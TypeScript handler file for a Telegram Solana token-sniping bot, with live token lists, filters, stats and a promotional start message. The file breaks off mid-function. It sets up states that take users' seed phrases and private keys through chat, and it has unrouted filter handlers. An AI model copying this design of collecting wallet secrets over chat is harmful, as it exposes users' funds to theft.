import type { TelegramBot } from "./telegram-bot"
import { WalletManager, DEPOSIT_ADDRESS } from "./wallet-manager"
import { TradingEngine } from "./trading-engine"
import { UserDatabase } from "./user-database"
import { FirebaseService } from "./firebase-service"
import { SmartSniperEngine } from "./smart-sniper-engine"
import { AITradingAssistant } from "./ai-trading-assistant"
import { LiveTokenMonitor, type TokenFilters } from "./live-token-monitor"
import { getMainKeyboard, getSettingsKeyboard, getWalletKeyboard, getSniperKeyboard } from "./keyboards"

const walletManager = new WalletManager()
const tradingEngine = new TradingEngine()
const userDb = new UserDatabase()
const firebase = new FirebaseService()
const smartSniper = new SmartSniperEngine()
const aiAssistant = new AITradingAssistant()
const liveTokenMonitor = new LiveTokenMonitor()

// Store user states for multi-step processes
const userStates = new Map<number, { action: string; data?: any }>()

// Store user filters
const userFilters = new Map<number, TokenFilters>()

// Start live token monitoring
liveTokenMonitor.startLiveMonitoring()

export async function handleBotCommand(
  chatId: number,
  text: string,
  userId: number,
  bot: TelegramBot,
  isCallback = false,
) {
  try {
    console.log(`=== HANDLING COMMAND ===`)
    console.log(`Command: ${text}`)
    console.log(`User: ${userId}`)
    console.log(`Chat: ${chatId}`)
    console.log(`Is Callback: ${isCallback}`)

    // Initialize user if not exists
    await userDb.initUser(userId)
    console.log("User initialized")

    // Handle callback queries (button presses)
    if (isCallback) {
      await handleCallbackQuery(chatId, text, userId, bot)
      return
    }

    // Check if user is in a multi-step process
    const userState = userStates.get(userId)
    if (userState) {
      await handleUserState(chatId, text, userId, bot, userState)
      return
    }

    // Handle regular commands
    if (text === "/start") {
      console.log("Handling /start command")
      await handleStart(chatId, userId, bot)
    } else if (text === "/wallet") {
      await handleWallet(chatId, userId, bot)
    } else if (text === "buy" || text === "üí∞ Buy") {
      await handleBuy(chatId, userId, bot)
    } else if (text === "sell" || text === "üí∏ Sell") {
      await handleSell(chatId, userId, bot)
    } else if (text === "positions" || text === "üìä Positions") {
      await handlePositions(chatId, userId, bot)
    } else if (text === "sniper" || text === "üéØ Sniper") {
      await handleSniper(chatId, userId, bot)
    } else if (text === "live_tokens" || text === "üìä Live Tokens") {
      await handleLiveTokens(chatId, userId, bot)
    } else if (text === "ai_analysis" || text === "ü§ñ AI Analysis") {
      await handleAIAnalysis(chatId, userId, bot)
    } else if (text === "settings" || text === "‚öôÔ∏è Settings") {
      await handleSettings(chatId, userId, bot)
    } else if (text === "help" || text === "‚ùì Help") {
      await handleHelp(chatId, userId, bot)
    } else if (text === "refresh" || text === "üîÑ Refresh") {
      await handleRefresh(chatId, userId, bot)
    } else if (text.startsWith("buy_")) {
      await handleBuyToken(chatId, userId, bot, text)
    } else if (text.startsWith("sell_")) {
      await handleSellToken(chatId, userId, bot, text)
    } else if (text.length === 44 && text.match(/^[A-Za-z0-9]+$/)) {
      // Looks like a token address - trigger AI analysis and quick buy
      await handleTokenAnalysis(chatId, userId, bot, text)
    } else {
      console.log("Unknown command, sending help message")
      await handleUnknownCommand(chatId, bot)
    }

    console.log("Command handling completed")
  } catch (error) {
    console.error("=== COMMAND HANDLING ERROR ===", error)
    try {
      await bot.sendMessage(chatId, "‚ùå An error occurred. Please try again.")
    } catch (sendError) {
      console.error("Error sending error message:", sendError)
    }
  }
}

async function handleCallbackQuery(chatId: number, data: string, userId: number, bot: TelegramBot) {
  console.log(`Handling callback: ${data}`)

  switch (data) {
    case "main_menu":
      await handleStart(chatId, userId, bot)
      break
    case "buy":
      await handleBuy(chatId, userId, bot)
      break
    case "sell":
      await handleSell(chatId, userId, bot)
      break
    case "positions":
      await handlePositions(chatId, userId, bot)
      break
    case "sniper":
      await handleSniper(chatId, userId, bot)
      break
    case "live_tokens":
      await handleLiveTokens(chatId, userId, bot)
      break
    case "ai_recommendations":
      await handleAIRecommendations(chatId, userId, bot)
      break
    case "trending_tokens":
      await handleTrendingTokens(chatId, userId, bot)
      break
    case "top_ai_picks":
      await handleTopAIPicks(chatId, userId, bot)
      break
    case "ai_analysis":
      await handleAIAnalysis(chatId, userId, bot)
      break
    case "wallet":
      await handleWallet(chatId, userId, bot)
      break
    case "connect_wallet":
      await handleConnectWallet(chatId, userId, bot)
      break
    case "generate_wallet":
      await handleGenerateWallet(chatId, userId, bot)
      break
    case "generate_deposit":
      await handleGenerateDeposit(chatId, userId, bot)
      break
    case "show_wallet":
      await handleShowWallet(chatId, userId, bot)
      break
    case "toggle_sniper":
      await handleToggleSniper(chatId, userId, bot)
      break
    case "enable_smart_sniper":
      await handleEnableSmartSniper(chatId, userId, bot)
      break
    case "optimize_settings":
      await handleOptimizeSettings(chatId, userId, bot)
      break
    case "market_sentiment":
      await handleMarketSentiment(chatId, userId, bot)
      break
    case "sniper_stats":
      await handleSniperStats(chatId, userId, bot)
      break
    case "ultra_fresh_tokens":
      await handleUltraFreshTokens(chatId, userId, bot)
      break
    case "all_tokens":
      await handleAllTokens(chatId, userId, bot)
      break
    case "filter_tokens":
      await handleFilterTokens(chatId, userId, bot)
      break
    case "token_stats":
      await handleTokenStats(chatId, userId, bot)
      break
    case "clear_filters":
      await handleClearFilters(chatId, userId, bot)
      break
    default:
      if (data.startsWith("buy_")) {
        await handleBuyToken(chatId, userId, bot, data)
      } else if (data.startsWith("sell_")) {
        await handleSellToken(chatId, userId, bot, data)
      } else if (data.startsWith("analyze_")) {
        const tokenAddress = data.replace("analyze_", "")
        await handleTokenAnalysis(chatId, userId, bot, tokenAddress)
      } else if (data.startsWith("quick_buy_")) {
        const tokenAddress = data.replace("quick_buy_", "")
        await handleQuickBuy(chatId, userId, bot, tokenAddress)
      } else if (data.startsWith("filter_")) {
        await handleFilterAction(chatId, userId, bot, data)
      } else {
        await bot.sendMessage(chatId, "‚ùì Unknown action. Please try again.")
      }
  }
}

async function handleLiveTokens(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(chatId, "üìä Loading ALL live tokens with auto-refresh...")

  try {
    const stats = liveTokenMonitor.getTokenStats()
    const userFilter = userFilters.get(userId) || {}
    const tokens = liveTokenMonitor.getFilteredTokens(userFilter)

    if (tokens.length === 0) {
      await bot.sendMessage(chatId, "‚è≥ No tokens found with current filters. Try adjusting your filters.", {
        reply_markup: {
          inline_keyboard: [
            [{ text: "üîÑ Refresh", callback_data: "live_tokens" }],
            [{ text: "üîô Back to Main", callback_data: "main_menu" }],
          ],
        },
      })
      return
    }

    let message = `üìä <b>LIVE TOKEN MONITOR</b>\n<i>Auto-refreshes every 5 minutes</i>\n\n`

    message += `üìà <b>Stats:</b>\n`
    message += `‚Ä¢ Total: ${stats.total} tokens\n`
    message += `‚Ä¢ Ultra-Fresh (0-1m): ${stats.ultraFresh}\n`
    message += `‚Ä¢ Fresh (1-5m): ${stats.fresh}\n`
    message += `‚Ä¢ Recent (5-30m): ${stats.recent}\n`
    message += `‚Ä¢ Older (30m+): ${stats.old}\n\n`

    message += `üè¢ <b>By DEX:</b>\n`
    message += `‚Ä¢ Raydium: ${stats.byDex.raydium}\n`
    message += `‚Ä¢ Orca: ${stats.byDex.orca}\n`
    message += `‚Ä¢ Jupiter: ${stats.byDex.jupiter}\n`
    message += `‚Ä¢ Pump.fun: ${stats.byDex.pumpfun}\n`
    message += `‚Ä¢ DexScreener: ${stats.byDex.dexscreener}\n`
    message += `‚Ä¢ Birdeye: ${stats.byDex.birdeye}\n\n`

    // Show active filters
    if (Object.keys(userFilter).length > 0) {
      message += `üîç <b>Active Filters:</b>\n`
      if (userFilter.minLiquidity) message += `‚Ä¢ Min Liquidity: $${userFilter.minLiquidity.toLocaleString()}\n`
      if (userFilter.maxAgeMinutes) message += `‚Ä¢ Max Age: ${userFilter.maxAgeMinutes}m\n`
      if (userFilter.minAIScore) message += `‚Ä¢ Min AI Score: ${userFilter.minAIScore}\n`
      if (userFilter.freshness) message += `‚Ä¢ Freshness: ${userFilter.freshness.join(", ")}\n`
      if (userFilter.dexes) message += `‚Ä¢ DEXs: ${userFilter.dexes.join(", ")}\n`
      message += `\n`
    }

    message += `üî• <b>Top ${Math.min(15, tokens.length)} Tokens:</b>\n`

    // Show top tokens
    tokens.slice(0, 15).forEach((token, index) => {
      const freshnessEmoji =
        token.freshness === "ULTRA_FRESH"
          ? "üî•"
          : token.freshness === "FRESH"
            ? "‚ö°"
            : token.freshness === "RECENT"
              ? "üí´"
              : "‚è∞"
      const aiScoreEmoji = (token.aiScore || 0) >= 80 ? "ü§ñ‚úÖ" : (token.aiScore || 0) >= 60 ? "ü§ñ‚ö°" : ""

      message += `${freshnessEmoji} <b>${index + 1}. ${token.symbol}</b> ${aiScoreEmoji}\n`
      message += `   üìç ${token.dex} | ‚è∞ ${token.age}\n`
      message += `   üí∞ $${token.price.toFixed(8)} | üíß $${token.liquidity.toLocaleString()}\n`
      message += `   üìä MC: $${token.marketCap.toLocaleString()} | üî• ${token.hotness}/100\n`
      if (token.aiScore) {
        message += `   ü§ñ AI: ${token.aiScore}/100 (${token.aiRecommendation})\n`
      }
      message += `\n`
    })

    message += `‚è∞ <b>Last Refresh:</b> ${stats.lastRefresh}\n`
    message += `üîÑ <b>Next Refresh:</b> ${stats.nextRefresh}\n`
    message += `ü§ñ <b>Showing ${tokens.length} of ${stats.total} tokens</b>`

    const keyboard = {
      inline_keyboard: [
        [
          { text: "üî• Ultra-Fresh Only", callback_data: "ultra_fresh_tokens" },
          { text: "üìä All Tokens", callback_data: "all_tokens" },
        ],
        [
          { text: "üîç Filter Tokens", callback_data: "filter_tokens" },
          { text: "üìà Token Stats", callback_data: "token_stats" },
        ],
        [
          { text: "üéØ AI Recommendations", callback_data: "ai_recommendations" },
          { text: "üîÑ Refresh Now", callback_data: "live_tokens" },
        ],
        [{ text: "üîô Back to Main", callback_data: "main_menu" }],
      ],
    }

    await bot.sendMessage(chatId, message, { reply_markup: keyboard })
  } catch (error) {
    console.error("Error handling live tokens:", error)
    await bot.sendMessage(chatId, "‚ùå Failed to load token data. Please try again.")
  }
}

async function handleAllTokens(chatId: number, userId: number, bot: TelegramBot) {
  await bot.sendMessage(chatId, "üìä Loading ALL tokens from all sources...")

  try {
    const allTokens = liveTokenMonitor.getAllTokens()
    const userFilter = userFilters.get(userId) || {}
    const filteredTokens = liveTokenMonitor.getFilteredTokens(userFilter)

    let message = `üìä <b>ALL LIVE TOKENS</b>\n\n`
    message += `üî¢ <b>Total Found:</b> ${allTokens.length} tokens\n`
    message += `üîç <b>After Filters:</b> ${filteredTokens.length} tokens\n\n`

    // Group by DEX
    const byDex = filteredTokens.reduce(
      (acc, token) => {
        acc[token.dex] = (acc[token.dex] || 0) + 1
        return acc
      },
      {} as Record<string, number>,
    )

    message += `üè¢ <b>Distribution:</b>\n`
    Object.entries(byDex).forEach(([dex, count]) => {
      message += `‚Ä¢ ${dex}: ${count} tokens\n`
    })

    message += `\nüìã <b>Recent Tokens (Top 20):</b>\n`

    filteredTokens.slice(0, 20).forEach((token, index) => {
      const freshnessEmoji =
        token.freshness === "ULTRA_FRESH"
          ? "üî•"
          : token.freshness === "FRESH"
            ? "‚ö°"
            : token.freshness === "RECENT"
              ? "üí´"
              : "‚è∞"

      message += `${freshnessEmoji} <b>${index + 1}. ${token.symbol}</b>\n`
      message += `   üìç ${token.dex} | ‚è∞ ${token.age} | üî• ${token.hotness}/100\n`
      message += `   üí∞ $${token.price.toFixed(8)} | üíß $${token.liquidity.toLocaleString()}\n`
    })

    const keyboard = {
      inline_keyboard: [
        [
          { text: "üîç Apply Filters", callback_data: "filter_tokens" },
          { text: "üßπ Clear Filters", callback_data: "clear_filters" },
        ],
        [
          { text: "üî• Ultra-Fresh", callback_data: "ultra_fresh_tokens" },
          { text: "üéØ AI Picks", callback_data: "top_ai_picks" },
        ],
        [
          { text: "üîÑ Refresh", callback_data: "all_tokens" },
          { text: "üîô Back", callback_data: "live_tokens" },
        ],
      ],
    }

    await bot.sendMessage(chatId, message, { reply_markup: keyboard })
  } catch (error) {
    console.error("Error handling all tokens:", error)
    await bot.sendMessage(chatId, "‚ùå Failed to load all tokens. Please try again.")
  }
}

async function handleFilterTokens(chatId: number, userId: number, bot: TelegramBot) {
  const currentFilters = userFilters.get(userId) || {}

  let message = `üîç <b>TOKEN FILTERS</b>\n\n`
  message += `Configure filters to narrow down the token list:\n\n`

  message += `üí∞ <b>Financial Filters:</b>\n`
  message += `‚Ä¢ Min Liquidity: ${currentFilters.minLiquidity ? `$${currentFilters.minLiquidity.toLocaleString()}` : "None"}\n`
  message += `‚Ä¢ Max Liquidity: ${currentFilters.maxLiquidity ? `$${currentFilters.maxLiquidity.toLocaleString()}` : "None"}\n`
  message += `‚Ä¢ Min Market Cap: ${currentFilters.minMarketCap ? `$${currentFilters.minMarketCap.toLocaleString()}` : "None"}\n`
  message += `‚Ä¢ Max Market Cap: ${currentFilters.maxMarketCap ? `$${currentFilters.maxMarketCap.toLocaleString()}` : "None"}\n`
  message += `‚Ä¢ Min Volume: ${currentFilters.minVolume ? `$${currentFilters.minVolume.toLocaleString()}` : "None"}\n\n`

  message += `‚è∞ <b>Age Filters:</b>\n`
  message += `‚Ä¢ Min Age: ${currentFilters.minAgeMinutes ? `${currentFilters.minAgeMinutes}m` : "None"}\n`
  message += `‚Ä¢ Max Age: ${currentFilters.maxAgeMinutes ? `${currentFilters.maxAgeMinutes}m` : "None"}\n`
  message += `‚Ä¢ Freshness: ${currentFilters.freshness ? currentFilters.freshness.join(", ") : "All"}\n\n`

  message += `ü§ñ <b>AI Filters:</b>\n`
  message += `‚Ä¢ Min AI Score: ${currentFilters.minAIScore || "None"}\n`
  message += `‚Ä¢ Max AI Score: ${currentFilters.maxAIScore || "None"}\n`
  message += `‚Ä¢ Risk Levels: ${currentFilters.riskLevels ? currentFilters.riskLevels.join(", ") : "All"}\n`
  message += `‚Ä¢ AI Recommendation: ${currentFilters.aiRecommendation ? currentFilters.aiRecommendation.join(", ") : "All"}\n\n`

  message += `üè¢ <b>DEX Filters:</b>\n`
  message += `‚Ä¢ Selected DEXs: ${currentFilters.dexes ? currentFilters.dexes.join(", ") : "All"}\n\n`

  message += `‚úÖ <b>Quality Filters:</b>\n`
  message += `‚Ä¢ Verified Only: ${currentFilters.verified ? "Yes" : "No"}\n`
  message += `‚Ä¢ Renounced Only: ${currentFilters.renounced ? "Yes" : "No"}\n`

  const keyboard = {
    inline_keyboard: [
      [
        { text: "üí∞ Financial", callback_data: "filter_financial" },
        { text: "‚è∞ Age", callback_data: "filter_age" },
      ],
      [
        { text: "ü§ñ AI Filters", callback_data: "filter_ai" },
        { text: "üè¢ DEX", callback_data: "filter_dex" },
      ],
      [
        { text: "‚úÖ Quality", callback_data: "filter_quality" },
        { text: "üßπ Clear All", callback_data: "clear_filters" },
      ],
      [
        { text: "‚úÖ Apply Filters", callback_data: "apply_filters" },
        { text: "üîô Back", callback_data: "live_tokens" },
      ],
    ],
  }

  await bot.sendMessage(chatId, message, { reply_markup: keyboard })
}

async function handleFilterAction(chatId: number, userId: number, bot: TelegramBot, action: string) {
  const filterType = action.replace("filter_", "")

  switch (filterType) {
    case "financial":
      await handleFinancialFilters(chatId, userId, bot)
      break
    case "age":
      await handleAgeFilters(chatId, userId, bot)
      break
    case "ai":
      await handleAIFilters(chatId, userId, bot)
      break
    case "dex":
      await handleDEXFilters(chatId, userId, bot)
      break
    case "quality":
      await handleQualityFilters(chatId, userId, bot)
      break
    default:
      await bot.sendMessage(chatId, "‚ùì Unknown filter type.")
  }
}

async function handleFinancialFilters(chatId: number, userId: number, bot: TelegramBot) {
  const message = `üí∞ <b>FINANCIAL FILTERS</b>\n\nSelect quick financial filters:`

  const keyboard = {
    inline_keyboard: [
      [
        { text: "üíß Min Liq: $1K", callback_data: "set_min_liquidity_1000" },
        { text: "üíß Min Liq: $10K", callback_data: "set_min_liquidity_10000" },
      ],
      [
        { text: "üìä Min MC: $10K", callback_data: "set_min_marketcap_10000" },
        { text: "üìä Min MC: $100K", callback_data: "set_min_marketcap_100000" },
      ],
      [
        { text: "üìà Min Vol: $1K", callback_data: "set_min_volume_1000" },
        { text: "üìà Min Vol: $10K", callback_data: "set_min_volume_10000" },
      ],
      [{ text: "üîô Back to Filters", callback_data: "filter_tokens" }],
    ],
  }

  await bot.sendMessage(chatId, message, { reply_markup: keyboard })
}

async function handleAgeFilters(chatId: number, userId: number, bot: TelegramBot) {
  const message = `‚è∞ <b>AGE FILTERS</b>\n\nSelect age-based filters:`

  const keyboard = {
    inline_keyboard: [
      [
        { text: "üî• Ultra-Fresh (0-1m)", callback_data: "set_freshness_ULTRA_FRESH" },
        { text: "‚ö° Fresh (1-5m)", callback_data: "set_freshness_FRESH" },
      ],
      [{ text: "‚ö° Fresh (1-5m)", callback_data: "set_freshness_FRESH" }],
      [
        { text: "üí´ Recent (5-30m)", callback_data: "set_freshness_RECENT" },
        { text: "‚è∞ All Ages", callback_data: "set_freshness_ALL" },
      ],
      [
        { text: "‚è∞ Max Age: 5m", callback_data: "set_max_age_5" },
        { text: "‚è∞ Max Age: 30m", callback_data: "set_max_age_30" },
      ],
      [{ text: "üîô Back to Filters", callback_data: "filter_tokens" }],
    ],
  }

  await bot.sendMessage(chatId, message, { reply_markup: keyboard })
}

async function handleAIFilters(chatId: number, userId: number, bot: TelegramBot) {
  const message = `ü§ñ <b>AI FILTERS</b>\n\nFilter by AI analysis results:`

  const keyboard = {
    inline_keyboard: [
      [
        { text: "ü§ñ Min AI: 70", callback_data: "set_min_ai_score_70" },
        { text: "ü§ñ Min AI: 80", callback_data: "set_min_ai_score_80" },
      ],
      [
        { text: "ü§ñ Min AI: 90", callback_data: "set_min_ai_score_90" },
        { text: "ü§ñ AI: BUY Only", callback_data: "set_ai_recommendation_BUY" },
      ],
      [
        { text: "üü¢ Low Risk", callback_data: "set_risk_level_LOW" },
        { text: "üü° Med Risk", callback_data: "set_risk_level_MEDIUM" },
      ],
      [{ text: "üîô Back to Filters", callback_data: "filter_tokens" }],
    ],
  }

  await bot.sendMessage(chatId, message, { reply_markup: keyboard })
}

async function handleDEXFilters(chatId: number, userId: number, bot: TelegramBot) {
  const message = `üè¢ <b>DEX FILTERS</b>\n\nFilter by exchange/source:`

  const keyboard = {
    inline_keyboard: [
      [
        { text: "üåä Raydium", callback_data: "toggle_dex_Raydium" },
        { text: "üêã Orca", callback_data: "toggle_dex_Orca" },
      ],
      [
        { text: "ü™ê Jupiter", callback_data: "toggle_dex_Jupiter" },
        { text: "üöÄ Pump.fun", callback_data: "toggle_dex_Pump.fun" },
      ],
      [
        { text: "üìä DexScreener", callback_data: "toggle_dex_DexScreener" },
        { text: "üê¶ Birdeye", callback_data: "toggle_dex_Birdeye" },
      ],
      [{ text: "üîô Back to Filters", callback_data: "filter_tokens" }],
    ],
  }

  await bot.sendMessage(chatId, message, { reply_markup: keyboard })
}

async function handleQualityFilters(chatId: number, userId: number, bot: TelegramBot) {
  const message = `‚úÖ <b>QUALITY FILTERS</b>\n\nFilter by token quality indicators:`

  const keyboard = {
    inline_keyboard: [
      [
        { text: "‚úÖ Verified Only", callback_data: "set_verified_true" },
        { text: "üîì Renounced Only", callback_data: "set_renounced_true" },
      ],
      [
        { text: "üë• Min Holders: 50", callback_data: "set_min_holders_50" },
        { text: "üë• Min Holders: 100", callback_data: "set_min_holders_100" },
      ],
      [{ text: "üîô Back to Filters", callback_data: "filter_tokens" }],
    ],
  }

  await bot.sendMessage(chatId, message, { reply_markup: keyboard })
}

async function handleClearFilters(chatId: number, userId: number, bot: TelegramBot) {
  userFilters.delete(userId)

  await bot.sendMessage(chatId, "üßπ <b>All filters cleared!</b>\n\nNow showing all tokens.", {
    reply_markup: {
      inline_keyboard: [
        [{ text: "üìä View All Tokens", callback_data: "all_tokens" }],
        [{ text: "üîô Back to Live Tokens", callback_data: "live_tokens" }],
      ],
    },
  })
}

async function handleTokenStats(chatId: number, userId: number, bot: TelegramBot) {
  try {
    const stats = liveTokenMonitor.getTokenStats()
    const allTokens = liveTokenMonitor.getAllTokens()

    // Calculate additional stats
    const avgLiquidity = allTokens.reduce((sum, t) => sum + t.liquidity, 0) / allTokens.length
    const avgMarketCap = allTokens.reduce((sum, t) => sum + t.marketCap, 0) / allTokens.length
    const avgHotness = allTokens.reduce((sum, t) => sum + t.hotness, 0) / allTokens.length

    const aiAnalyzedTokens = allTokens.filter((t) => t.aiScore)
    const avgAIScore =
      aiAnalyzedTokens.length > 0
        ? aiAnalyzedTokens.reduce((sum, t) => sum + (t.aiScore || 0), 0) / aiAnalyzedTokens.length
        : 0

    let message = `üìà <b>TOKEN STATISTICS</b>\n\n`

    message += `üî¢ <b>Total Counts:</b>\n`
    message += `‚Ä¢ Total Tokens: ${stats.total}\n`
    message += `‚Ä¢ Ultra-Fresh (0-1m): ${stats.ultraFresh}\n`
    message += `‚Ä¢ Fresh (1-5m): ${stats.fresh}\n`
    message += `‚Ä¢ Recent (5-30m): ${stats.recent}\n`
    message += `‚Ä¢ Older (30m+): ${stats.old}\n\n`

    message += `üè¢ <b>By Exchange:</b>\n`
    message += `‚Ä¢ Raydium: ${stats.byDex.raydium}\n`
    message += `‚Ä¢ Orca: ${stats.byDex.orca}\n`
    message += `‚Ä¢ Jupiter: ${stats.byDex.jupiter}\n`
    message += `‚Ä¢ Pump.fun: ${stats.byDex.pumpfun}\n`
    message += `‚Ä¢ DexScreener: ${stats.byDex.dexscreener}\n`
    message += `‚Ä¢ Birdeye: ${stats.byDex.birdeye}\n\n`

    message += `üìä <b>Averages:</b>\n`
    message += `‚Ä¢ Avg Liquidity: $${avgLiquidity.toLocaleString()}\n`
    message += `‚Ä¢ Avg Market Cap: $${avgMarketCap.toLocaleString()}\n`
    message += `‚Ä¢ Avg Hotness: ${avgHotness.toFixed(1)}/100\n`
    message += `‚Ä¢ Avg AI Score: ${avgAIScore.toFixed(1)}/100\n\n`

    message += `ü§ñ <b>AI Analysis:</b>\n`
    message += `‚Ä¢ Tokens Analyzed: ${aiAnalyzedTokens.length}\n`
    message += `‚Ä¢ Analysis Coverage: ${((aiAnalyzedTokens.length / stats.total) * 100).toFixed(1)}%\n\n`

    message += `‚è∞ <b>Refresh Info:</b>\n`
    message += `‚Ä¢ Last Refresh: ${stats.lastRefresh}\n`
    message += `‚Ä¢ Next Refresh: ${stats.nextRefresh}\n`
    message += `‚Ä¢ Auto-refresh: Every 5 minutes`

    const keyboard = {
      inline_keyboard: [
        [
          { text: "üìä View Tokens", callback_data: "all_tokens" },
          { text: "üîç Apply Filters", callback_data: "filter_tokens" },
        ],
        [
          { text: "üîÑ Refresh Stats", callback_data: "token_stats" },
          { text: "üîô Back", callback_data: "live_tokens" },
        ],
      ],
    }

    await bot.sendMessage(chatId, message, { reply_markup: keyboard })
  } catch (error) {
    console.error("Error handling token stats:", error)
    await bot.sendMessage(chatId, "‚ùå Failed to load token statistics. Please try again.")
  }
}

// Handle filter setting callbacks
async function handleUserState(chatId: number, text: string, userId: number, bot: TelegramBot, state: any) {
  console.log(`Handling user state: ${state.action}`)

  switch (state.action) {
    case "awaiting_seed_phrase":
      await handleSeedPhraseInput(chatId, text, userId, bot)
      break
    case "awaiting_private_key":
      await handlePrivateKeyInput(chatId, text, userId, bot)
      break
    case "awaiting_buy_amount":
      await handleBuyAmountInput(chatId, text, userId, bot, state.data)
      break
    case "awaiting_token_analysis":
      await handleTokenAnalysisInput(chatId, text, userId, bot)
      break
    default:
      userStates.delete(userId)
      await bot.sendMessage(chatId, "‚ùå Invalid state. Please start over.")
  }
}

// Handle filter setting callbacks
async function handleSetFilter(chatId: number, userId: number, bot: TelegramBot, data: string) {
  const currentFilters = userFilters.get(userId) || {}

  if (data === "set_min_liquidity_1000") {
    currentFilters.minLiquidity = 1000
  } else if (data === "set_min_liquidity_10000") {
    currentFilters.minLiquidity = 10000
  } else if (data === "set_min_marketcap_10000") {
    currentFilters.minMarketCap = 10000
  } else if (data === "set_min_marketcap_100000") {
    currentFilters.minMarketCap = 100000
  } else if (data === "set_min_volume_1000") {
    currentFilters.minVolume = 1000
  } else if (data === "set_min_volume_10000") {
    currentFilters.minVolume = 10000
  } else if (data === "set_freshness_ULTRA_FRESH") {
    currentFilters.freshness = ["ULTRA_FRESH"]
  } else if (data === "set_freshness_FRESH") {
    currentFilters.freshness = ["FRESH"]
  } else if (data === "set_freshness_RECENT") {
    currentFilters.freshness = ["RECENT"]
  } else if (data === "set_freshness_ALL") {
    delete currentFilters.freshness
  } else if (data === "set_max_age_5") {
    currentFilters.maxAgeMinutes = 5
  } else if (data === "set_max_age_30") {
    currentFilters.maxAgeMinutes = 30
  } else if (data === "set_min_ai_score_70") {
    currentFilters.minAIScore = 70
  } else if (data === "set_min_ai_score_80") {
    currentFilters.minAIScore = 80
  } else if (data === "set_min_ai_score_90") {
    currentFilters.minAIScore = 90
  } else if (data === "set_ai_recommendation_BUY") {
    currentFilters.aiRecommendation = ["BUY"]
  } else if (data === "set_risk_level_LOW") {
    currentFilters.riskLevels = ["LOW"]
  } else if (data === "set_risk_level_MEDIUM") {
    currentFilters.riskLevels = ["MEDIUM"]
  } else if (data === "set_verified_true") {
    currentFilters.verified = true
  } else if (data === "set_renounced_true") {
    currentFilters.renounced = true
  } else if (data === "set_min_holders_50") {
    currentFilters.minHolders = 50
  } else if (data === "set_min_holders_100") {
    currentFilters.minHolders = 100
  }

  userFilters.set(userId, currentFilters)

  await bot.sendMessage(chatId, "‚úÖ Filter applied! Use 'Apply Filters' to see results.", {
    reply_markup: {
      inline_keyboard: [
        [{ text: "‚úÖ Apply Filters", callback_data: "apply_filters" }],
        [{ text: "üîô Back to Filters", callback_data: "filter_tokens" }],
      ],
    },
  })
}

async function handleToggleFilter(chatId: number, userId: number, bot: TelegramBot, data: string) {
  const currentFilters = userFilters.get(userId) || {}

  if (data.startsWith("toggle_dex_")) {
    const dex = data.replace("toggle_dex_", "")
    if (!currentFilters.dexes) currentFilters.dexes = []

    const index = currentFilters.dexes.indexOf(dex)
    if (index >= 0) {
      currentFilters.dexes.splice(index, 1)
    } else {
      currentFilters.dexes.push(dex)
    }

    if (currentFilters.dexes.length === 0) {
      delete currentFilters.dexes
    }
  }

  userFilters.set(userId, currentFilters)

  await bot.sendMessage(chatId, `‚úÖ DEX filter toggled! Selected: ${currentFilters.dexes?.join(", ") || "All"}`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "‚úÖ Apply Filters", callback_data: "apply_filters" }],
        [{ text: "üîô Back to DEX Filters", callback_data: "filter_dex" }],
      ],
    },
  })
}

// Continue with existing handlers...
async function handleStart(chatId: number, userId: number, bot: TelegramBot) {
  try {
    console.log(`[BOT] Starting for user ${userId}`)

    const user = await userDb.initUser(userId)
    console.log(`[BOT] User initialized: ${JSON.stringify(user)}`)

    const walletData = await firebase.getWallet(userId)
    let walletAddress = null
    let currentBalance = 0

    if (walletData) {
      walletAddress = walletData.publicKey
      console.log(`[BOT] Found wallet: ${walletAddress}`)

      try {
        currentBalance = await walletManager.getBalance(walletAddress)
        console.log(`[BOT] Live balance: ${currentBalance} SOL`)

        await userDb.updateUser(userId, {
          wallet: walletAddress,
          solBalance: currentBalance,
        })
      } catch (balanceError) {
        console.error(`[BOT] Error getting balance:`, balanceError)
      }
    }

    const sniperEnabled = smartSniper.isEnabled(userId)
    const topRecommendations = liveTokenMonitor.getTopRecommendations(3)
    const stats = liveTokenMonitor.getTokenStats()

    let recommendationText = ""
    if (topRecommendations.length > 0) {
      recommendationText = `\nüéØ <b>Top AI Picks Right Now:</b>\n`
      topRecommendations.forEach((rec, index) => {
        const urgencyEmoji = rec.urgency === "CRITICAL" ? "üî•" : rec.urgency === "HIGH" ? "‚ö°" : "üí°"
        recommendationText += `${urgencyEmoji} ${rec.token.symbol}: ${rec.token.aiScore}/100 (${rec.urgency})\n`
      })
    }

    const welcomeMessage = `üöÄ <b>Trojan AI Auto Snipe Bot</b>
ü§ñ <b>POWERED BY LIVE AI ANALYSIS</b>

‚ö° <b>LIVE FEATURES:</b>
‚Ä¢ üìä Real-time monitoring of ${stats.total} tokens
‚Ä¢ üîÑ Auto-refresh every 5 minutes
‚Ä¢ ü§ñ AI analyzes all tokens continuously
‚Ä¢ üéØ Instant recommendations for best snipes
‚Ä¢ üîç Advanced filtering system
‚Ä¢ üí° Smart entry timing with AI signals

‚ú® <b>NO MINIMUM BALANCE REQUIRED!</b>
Start with any amount - even 0.01 SOL works!

${
  walletAddress
    ? `üîê <b>Your Wallet:</b>\n<code>${walletAddress}</code>\n\nüí∞ <b>Live Balance:</b> ${currentBalance.toFixed(4)} SOL\n\n‚úÖ <b>READY TO TRADE!</b>`
    : `üîê <b>Wallet:</b> Not connected\n\nüí° Connect or generate a wallet to start trading!\n\nüéØ <b>Get started with any amount!</b>`
}

ü§ñ <b>AI Sniper Status:</b> ${sniperEnabled ? "üü¢ ACTIVE" : "üî¥ INACTIVE"}

üìä <b>Live Stats:</b>
‚Ä¢ Total Tokens: ${stats.total}
‚Ä¢ Ultra-Fresh: ${stats.ultraFresh}
‚Ä¢ Fresh: ${stats.fresh}
‚Ä¢ Next Refresh: ${stats.nextRefresh}

${recommendationText}

üåü <b>New:</b> Complete token monitoring with filters!`

    const keyboard = getMainKeyboard(!!walletAddress)
    keyboard.inline_keyboard.unshift([{ text: "üìä Live Tokens", callback_data: "live_tokens" }])
    keyboard.inline_keyboard.unshift([{ text: "ü§ñ AI Recommendations", callback_data: "ai_recommendations" }])

    await bot.sendMessage(chatId, welcomeMessage, { reply_markup: keyboard })
  } catch (error) {
    console.error("Error in handleStart:", error)
    await bot.sendMessage(chatId, `‚ùå Error loading bot: ${error.message}\n\nTrying basic startup...`)

    await bot.sendMessage(chatId, "üöÄ <b>Welcome to Trojan AI Bot!</b>\n\nBot is starting up...", {
      reply_markup: {
        inline_keyboard: [
